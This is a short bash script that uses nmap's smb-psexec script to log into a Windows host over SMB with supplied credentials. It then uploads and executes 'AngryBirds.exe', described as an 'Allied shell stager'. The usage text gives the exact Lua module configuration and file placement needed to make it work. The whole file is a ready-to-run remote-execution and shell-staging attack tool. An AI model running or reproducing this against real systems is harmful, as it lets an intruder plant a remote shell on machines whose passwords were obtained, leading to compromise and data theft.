#!/bin/bash

ShowUsage() {
	echo ""
	echo "$0 <target> <username> <password> [<domain>]"
	echo "$0 will given a username and password attempt to upload and run the Allied AngryBirds.exe shell stager."
	echo "Note that the default psexec config is in /usr/share/nmap/nselib/data/psexec/alliedshellstager.lua which should have the following lines added:"
	echo ""
	echo "overrides = {}"
	echo ""
	echo "modules = {}"
	echo "local mod"
	echo ""
	echo "-- Run our shell"
	echo "mod = {}"
	echo "mod.upload           = true"
	echo "mod.name             = \"Upload and run AngryBirds.exe Allied shell stager\""
	echo "mod.program          = \"AngryBirds.exe\""
	echo "mod.args             = \"\""
	echo "mod.noblank          = true"
	echo "table.insert(modules, mod)"
	echo ""
	echo "The AngryBirds.exe will also need to be placed in /usr/share/nmap/nselib/data/psexec"
	echo ""
}


if [ $# -lt 3 ]; then
	ShowUsage
	exit 1
fi

TARGET=$1
USERNAME="$2"
PASSWORD="$3"
if [ $# -ge 4 ]; then
	DOMAIN="$4"
else
	DOMAIN=""
fi

if [ ${#DOMAIN} -gt 0 ]; then
	nmap -p 445 --script=smb-psexec --script-args=config=alliedshellstager,smbdomain="$DOMAIN",smbuser="$USERNAME",smbpass="$PASSWORD" $TARGET
else
	nmap -p 445 --script=smb-psexec --script-args=config=alliedshellstager,smbuser="$USERNAME",smbpass="$PASSWORD" $TARGET
fi

